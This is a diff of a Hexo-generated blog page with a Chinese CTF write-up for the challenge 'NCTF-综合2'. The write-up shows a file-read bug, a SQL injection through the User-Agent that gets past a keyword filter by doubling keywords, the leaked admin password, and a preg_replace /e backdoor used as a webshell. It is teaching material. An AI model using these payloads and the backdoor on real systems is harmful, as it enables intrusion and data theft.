@@ -52,7 +52,7 @@
 
   <script  src="/js/utils.js" ></script>
   <script  src="/js/color-schema.js" ></script>
-<meta name="generator" content="Hexo 5.4.0"></head>
+<meta name="generator" content="Hexo 6.3.0"></head>
 
 
 <body>
@@ -249,7 +249,7 @@
               <h1 id="NCTF-综合2"><a href="#NCTF-综合2" class="headerlink" title="NCTF-综合2"></a>NCTF-综合2</h1><span id="more"></span>
 
 <p>进入页面，没什么特别的地方，随便点点</p>
-<p><img src="https://i.loli.net/2020/11/30/9Vf7JA3OWC68arb.png" srcset="/img/loading.gif" alt></p>
+<p><img src="https://i.loli.net/2020/11/30/9Vf7JA3OWC68arb.png" srcset="/img/loading.gif"></p>
 <p>留言可以正常提交，本以为有xss,但是已经提示不是xss</p>
 <p>看到最下面有个网站说明   <a target="_blank" rel="noopener" href="http://cms.nuptzj.cn/about.php?file=sm.txt">本CMS说明</a>  ，有用的内容如下</p>
 <blockquote>
@@ -264,29 +264,29 @@
 <p>尝试读取index.php的源码，发现好像并没有什么用</p>
 <p>读取<code>about.php</code></p>
 <div class="hljs"><pre><code class="hljs php+HTML">
-&lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;utf-8&quot; &#x2F;&gt;
+&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;
 
 &lt;?php
-$file&#x3D;$_GET[&#39;file&#39;];
-if($file&#x3D;&#x3D;&quot;&quot; || strstr($file,&#39;config.php&#39;))&#123;   &#x2F;&#x2F; 有config.php
+$file=$_GET[&#x27;file&#x27;];
+if($file==&quot;&quot; || strstr($file,&#x27;config.php&#x27;))&#123;   // 有config.php
 	echo &quot;file参数不能为空！&quot;;
 	exit();
 &#125;else&#123;
-	$cut&#x3D;strchr($file,&quot;loginxlcteam&quot;);   &#x2F;&#x2F;包含了 loginxlcteam页面
-	if($cut&#x3D;&#x3D;false)&#123;
-	$data&#x3D;file_get_contents($file);
-	$date&#x3D;htmlspecialchars($data);
+	$cut=strchr($file,&quot;loginxlcteam&quot;);   //包含了 loginxlcteam页面
+	if($cut==false)&#123;
+	$data=file_get_contents($file);
+	$date=htmlspecialchars($data);
 	echo $date;
 	&#125;else&#123;
-		echo &quot;&lt;script&gt;alert(&#39;敏感目录，禁止查看！但是。。。&#39;)&lt;&#x2F;script&gt;&quot;;
+		echo &quot;&lt;script&gt;alert(&#x27;敏感目录，禁止查看！但是。。。&#x27;)&lt;/script&gt;&quot;;
 	&#125;
 &#125;</code></pre></div>
 
 <p>读取config.php，无有用信息</p>
-<p><img src="/2020/09/03/%E7%BB%BC%E5%90%882/2.png" srcset="/img/loading.gif" alt></p>
+<p><img src="/2020/09/03/%E7%BB%BC%E5%90%882/2.png" srcset="/img/loading.gif"></p>
 <p>查看<code>loginxlcteam</code>,是个登录页面</p>
-<p><img src="https://i.loli.net/2020/12/04/LfWepcHgMhxl8AF.png" srcset="/img/loading.gif" alt></p>
-<p>到此还是无从下手，参考大佬的博客 <a target="_blank" rel="noopener" href="https://blog.csdn.net/zz_Caleb/article/details/88652838?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-3.nonecase&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-3.nonecase">https://blog.csdn.net/zz_Caleb/article/details/88652838?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-3.nonecase&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-3.nonecase</a> </p>
+<p><img src="https://i.loli.net/2020/12/04/LfWepcHgMhxl8AF.png" srcset="/img/loading.gif"></p>
+<p>到此还是无从下手，参考大佬的博客 <a target="_blank" rel="noopener" href="https://blog.csdn.net/zz_Caleb/article/details/88652838?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-3.nonecase&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-3.nonecase">https://blog.csdn.net/zz_Caleb/article/details/88652838?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-3.nonecase&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-3.nonecase</a> </p>
 <p>在搜索页面中也存在有用信息</p>
 <p> <code>http://cms.nuptzj.cn/about.php?file=so.php</code>获取源码</p>
 <div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-comment">//so.php</span>
@@ -299,16 +299,16 @@ if($file&#x3D;&#x3D;&quot;&quot; || strstr($file,&#39;config.php&#39;))&#123;   
 <span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;config.php&#x27;</span>;
 <span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;antiinject.php&#x27;</span>;   <span class="hljs-comment">//防注入的文件</span>
 <span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;antixss.php&#x27;</span>;      <span class="hljs-comment">//防xss的文件		</span>
-<span class="hljs-variable">$id</span>=antiinject(<span class="hljs-variable">$id</span>);		<span class="hljs-comment">//对id过滤</span>
-<span class="hljs-variable">$con</span> = mysql_connect(<span class="hljs-variable">$db_address</span>,<span class="hljs-variable">$db_user</span>,<span class="hljs-variable">$db_pass</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;不能连接到数据库！！&quot;</span>.mysql_error());
-mysql_select_db(<span class="hljs-variable">$db_name</span>,<span class="hljs-variable">$con</span>);
-<span class="hljs-variable">$id</span>=mysql_real_escape_string(<span class="hljs-variable">$id</span>);
-<span class="hljs-variable">$result</span>=mysql_query(<span class="hljs-string">&quot;SELECT * FROM `message` WHERE display=1 AND id=<span class="hljs-subst">$id</span>&quot;</span>);  <span class="hljs-comment">//sql查询，可能存在注入点</span>
-<span class="hljs-variable">$rs</span>=mysql_fetch_array(<span class="hljs-variable">$result</span>);
-<span class="hljs-keyword">echo</span> htmlspecialchars(<span class="hljs-variable">$rs</span>[<span class="hljs-string">&#x27;nice&#x27;</span>]).<span class="hljs-string">&#x27;:&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&#x27;</span>.antixss(<span class="hljs-variable">$rs</span>[<span class="hljs-string">&#x27;say&#x27;</span>]).<span class="hljs-string">&#x27;&lt;br /&gt;&#x27;</span>;
-mysql_free_result(<span class="hljs-variable">$result</span>);
-mysql_free_result(<span class="hljs-variable">$file</span>);
-mysql_close(<span class="hljs-variable">$con</span>);
+<span class="hljs-variable">$id</span>=<span class="hljs-title function_ invoke__">antiinject</span>(<span class="hljs-variable">$id</span>);		<span class="hljs-comment">//对id过滤</span>
+<span class="hljs-variable">$con</span> = <span class="hljs-title function_ invoke__">mysql_connect</span>(<span class="hljs-variable">$db_address</span>,<span class="hljs-variable">$db_user</span>,<span class="hljs-variable">$db_pass</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;不能连接到数据库！！&quot;</span>.<span class="hljs-title function_ invoke__">mysql_error</span>());
+<span class="hljs-title function_ invoke__">mysql_select_db</span>(<span class="hljs-variable">$db_name</span>,<span class="hljs-variable">$con</span>);
+<span class="hljs-variable">$id</span>=<span class="hljs-title function_ invoke__">mysql_real_escape_string</span>(<span class="hljs-variable">$id</span>);
+<span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-string">&quot;SELECT * FROM `message` WHERE display=1 AND id=<span class="hljs-subst">$id</span>&quot;</span>);  <span class="hljs-comment">//sql查询，可能存在注入点</span>
+<span class="hljs-variable">$rs</span>=<span class="hljs-title function_ invoke__">mysql_fetch_array</span>(<span class="hljs-variable">$result</span>);
+<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$rs</span>[<span class="hljs-string">&#x27;nice&#x27;</span>]).<span class="hljs-string">&#x27;:&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&#x27;</span>.<span class="hljs-title function_ invoke__">antixss</span>(<span class="hljs-variable">$rs</span>[<span class="hljs-string">&#x27;say&#x27;</span>]).<span class="hljs-string">&#x27;&lt;br /&gt;&#x27;</span>;
+<span class="hljs-title function_ invoke__">mysql_free_result</span>(<span class="hljs-variable">$result</span>);
+<span class="hljs-title function_ invoke__">mysql_free_result</span>(<span class="hljs-variable">$file</span>);
+<span class="hljs-title function_ invoke__">mysql_close</span>(<span class="hljs-variable">$con</span>);
 <span class="hljs-meta">?&gt;</span></code></pre></div>
 
 
@@ -319,10 +319,10 @@ mysql_close(<span class="hljs-variable">$con</span>);
  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">antiinject</span>(<span class="hljs-params"><span class="hljs-variable">$content</span></span>)</span>
 <span class="hljs-function"> </span>&#123; 
  	<span class="hljs-variable">$keyword</span>=<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;select&quot;</span>,<span class="hljs-string">&quot;union&quot;</span>,<span class="hljs-string">&quot;and&quot;</span>,<span class="hljs-string">&quot;from&quot;</span>,<span class="hljs-string">&#x27; &#x27;</span>,<span class="hljs-string">&quot;&#x27;&quot;</span>,<span class="hljs-string">&quot;;&quot;</span>,<span class="hljs-string">&#x27;&quot;&#x27;</span>,<span class="hljs-string">&quot;char&quot;</span>,<span class="hljs-string">&quot;or&quot;</span>,<span class="hljs-string">&quot;count&quot;</span>,<span class="hljs-string">&quot;master&quot;</span>,<span class="hljs-string">&quot;name&quot;</span>,<span class="hljs-string">&quot;pass&quot;</span>,<span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-string">&quot;+&quot;</span>,<span class="hljs-string">&quot;-&quot;</span>,<span class="hljs-string">&quot;order&quot;</span>,<span class="hljs-string">&quot;=&quot;</span>); <span class="hljs-comment">//对一些sql注入时用到的关键词进行了过滤</span>
-     <span class="hljs-variable">$info</span>=strtolower(<span class="hljs-variable">$content</span>); 
- 	<span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;=count(<span class="hljs-variable">$keyword</span>);<span class="hljs-variable">$i</span>++)
+     <span class="hljs-variable">$info</span>=<span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$content</span>); 
+ 	<span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;=<span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$keyword</span>);<span class="hljs-variable">$i</span>++)
  	&#123; 
- 		<span class="hljs-variable">$info</span>=str_replace(<span class="hljs-variable">$keyword</span>[<span class="hljs-variable">$i</span>], <span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$info</span>); 
+ 		<span class="hljs-variable">$info</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-variable">$keyword</span>[<span class="hljs-variable">$i</span>], <span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$info</span>); 
  	&#125; 
  <span class="hljs-keyword">return</span> <span class="hljs-variable">$info</span>; 
  &#125; 
@@ -334,24 +334,24 @@ mysql_close(<span class="hljs-variable">$con</span>);
 <p>3.对soid进行过滤后带入sql语句中查询</p>
 <p>于是抓包修改user-agent</p>
 <p>确定存在注入点</p>
-<p><img src="https://i.loli.net/2020/11/30/KGcINOm5XAxVhDE.png" srcset="/img/loading.gif" alt></p>
+<p><img src="https://i.loli.net/2020/11/30/KGcINOm5XAxVhDE.png" srcset="/img/loading.gif"></p>
 <p>由于之前提示了<strong>admin表结构 create table admin ( id integer, username text, userpass text, )</strong>  </p>
 <p>可直接写出查询语句</p>
 <div class="hljs"><pre><code class="hljs awk">(sselectelect<span class="hljs-regexp">/**/g</span>roup_concat(userppassass)<span class="hljs-regexp">/**/</span>ffromrom<span class="hljs-regexp">/**/</span>aadmindmin)</code></pre></div>
 
-<p><img src="https://i.loli.net/2020/11/30/wMtHrAcuYVWOn91.png" srcset="/img/loading.gif" alt></p>
+<p><img src="https://i.loli.net/2020/11/30/wMtHrAcuYVWOn91.png" srcset="/img/loading.gif"></p>
 <p>ASCII码转字符串结果为： fuckruntu </p>
 <p>登录</p>
-<p><img src="https://i.loli.net/2020/11/30/qZmL6EeW8O3MsYX.png" srcset="/img/loading.gif" alt></p>
+<p><img src="https://i.loli.net/2020/11/30/qZmL6EeW8O3MsYX.png" srcset="/img/loading.gif"></p>
 <p> <strong><a target="_blank" rel="noopener" href="http://cms.nuptzj.cn/about.php?file=xlcteam.php">http://cms.nuptzj.cn/about.php?file=xlcteam.php</a></strong>  查看源码</p>
 <div class="hljs"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span> 
 <span class="hljs-variable">$e</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;www&#x27;</span>]; 
 <span class="hljs-variable">$arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;wtf&#x27;</span>] =&gt; <span class="hljs-string">&#x27;|.*|e&#x27;</span>,); 
-array_walk(<span class="hljs-variable">$arr</span>, <span class="hljs-variable">$e</span>, <span class="hljs-string">&#x27;&#x27;</span>); 
+<span class="hljs-title function_ invoke__">array_walk</span>(<span class="hljs-variable">$arr</span>, <span class="hljs-variable">$e</span>, <span class="hljs-string">&#x27;&#x27;</span>); 
 <span class="hljs-meta">?&gt;</span></code></pre></div>
 
 <p>看样子是可以用菜刀连接的</p>
-<p> 那怎么利用小马呢，数组的value中是|.*|e，这里用到了正则匹配的preg_replace()的一个漏洞：<br>参考<a target="_blank" rel="noopener" href="https://www.jb51.net/article/38714.htm">https://www.jb51.net/article/38714.htm</a><br>简单来说就是正则中/e(这里和|e效果一样) 修正符使 preg_replace() 将 replacement 参数当作 PHP 代码（在适当的逆向引用替换完之后）。提示：要确保 replacement 构成一个合法的 PHP 代码字符串，否则 PHP 会在报告在包含 preg_replace() 的行中出现语法解析错误。<br>所以我们可以传递preg_replace给www，这样array中的值就是第一个参数，键就是第二个参数，正好可以利用preg_replace的漏洞，然后会执行$_POST[‘wtf’]，就相当于一个一句话马了。<br>用菜刀连接： </p>
+<p> 那怎么利用小马呢，数组的value中是|.*|e，这里用到了正则匹配的preg_replace()的一个漏洞：<br>参考<a target="_blank" rel="noopener" href="https://www.jb51.net/article/38714.htm">https://www.jb51.net/article/38714.htm</a><br>简单来说就是正则中&#x2F;e(这里和|e效果一样) 修正符使 preg_replace() 将 replacement 参数当作 PHP 代码（在适当的逆向引用替换完之后）。提示：要确保 replacement 构成一个合法的 PHP 代码字符串，否则 PHP 会在报告在包含 preg_replace() 的行中出现语法解析错误。<br>所以我们可以传递preg_replace给www，这样array中的值就是第一个参数，键就是第二个参数，正好可以利用preg_replace的漏洞，然后会执行$_POST[‘wtf’]，就相当于一个一句话马了。<br>用菜刀连接： </p>
 <p>url:<a target="_blank" rel="noopener" href="http://cms.nuptzj.cn/xlcteam.php?www=preg_replace">http://cms.nuptzj.cn/xlcteam.php?www=preg_replace</a></p>
 <p>密码：wtf</p>
 <p><strong>总结：算是一道比较难的题目了，涉及到知识点也很多，还需要多看看！！！</strong></p>
